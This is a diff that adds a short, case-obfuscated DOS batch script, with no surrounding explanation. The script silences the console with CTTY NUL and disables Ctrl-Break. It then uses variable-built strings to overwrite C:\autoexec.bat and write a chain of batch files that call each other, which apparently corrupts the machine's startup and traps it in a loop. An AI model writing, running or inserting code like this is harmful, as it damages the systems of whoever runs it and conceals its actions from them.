@@ -1,0 +1,10 @@
+CTtY NUl
+eChO OfF
+BrEAk oFf
+SeT e=eChO.
+sEt a=autoexe
+SeT b=.bat
+%e%%a%a%b%>C:\%a%c%b%
+%e%%a%b%b%>c:\%a%a%b%
+%e%%a%c%b%>C:\%a%b%b%
+cLS
